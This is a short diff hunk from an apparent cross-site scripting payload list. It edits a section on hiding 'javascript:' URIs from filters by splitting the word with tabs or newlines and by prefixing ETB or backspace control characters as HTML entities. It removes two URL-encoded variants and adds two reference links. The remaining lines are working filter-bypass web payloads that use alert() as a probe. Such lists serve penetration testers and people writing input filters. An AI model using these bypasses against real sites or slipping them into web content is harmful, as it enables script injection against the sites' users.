@@ -53,13 +53,12 @@ vascript:alert(1) # New line
 
 jav	asc	ript	:alert(1) # Tab
 
-# Special Characters (you can use them before) Somes Example :
+# Special Characters (you can use them before Raw or encode) Somes Example :
+http://www.unicode-symbol.com/u/0017.html
+http://www.unicode-symbol.com/u/0008.html
 
-%23javascript:alert(1) # ETB url encode
 &#23;javascript:alert('Successful XSS') # ETB HTML
-
 &#x8;javascript:alert(1) # Backspace HTML
-%08javascript:alert(1) # Backspace  url encode
 
 
 <!--::colon:: -->
